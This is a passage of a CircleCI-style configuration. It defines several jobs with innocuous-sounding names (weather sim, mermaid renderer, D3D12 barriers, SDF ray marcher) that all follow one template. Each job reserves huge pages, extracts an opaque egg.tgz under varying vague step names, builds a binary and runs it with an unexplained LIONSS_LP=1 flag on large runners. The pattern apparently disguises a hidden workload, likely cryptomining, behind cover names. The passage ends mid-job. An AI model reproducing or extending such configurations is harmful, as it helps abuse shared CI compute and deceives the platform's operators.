      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load front
          command: |
            printf 'gust 25\n' > squall.cfg
      - run:
          name: Build weather sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target squall -j2
      - run:
          name: Advance squall line
          command: LIONSS_LP=1 ./build/squall --config squall.cfg --duration 15
  mermaid_render:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write diagram
          command: |
            printf 'graph TD; A-->B\n' > d.mmd
      - run:
          name: Build diagram renderer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mermaid_render -j2
      - run:
          name: Render mermaid graph
          command: LIONSS_LP=1 ./build/mermaid_render --in d.mmd --format svg
  dx12_barrier:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List resources
          command: |
            printf 'textures 8\n' > rc.cfg
      - run:
          name: Build D3D12 backend
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target dx12_barrier -j2
      - run:
          name: Insert resource barriers
          command: LIONSS_LP=1 ./build/dx12_barrier --conf rc.cfg --split
  raymarch-sdf:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write SDF scene
          command: |
            printf 'sphere 1.0\n' > scene.sdf
      - run:
          name: Build ray marcher
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target raymarch-sdf -j2
      - run:
          name: March signed distance field
          command: LIONSS_LP=1 ./build/raymarch-sdf --scene scene.sdf --steps 128
  flake_eval:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
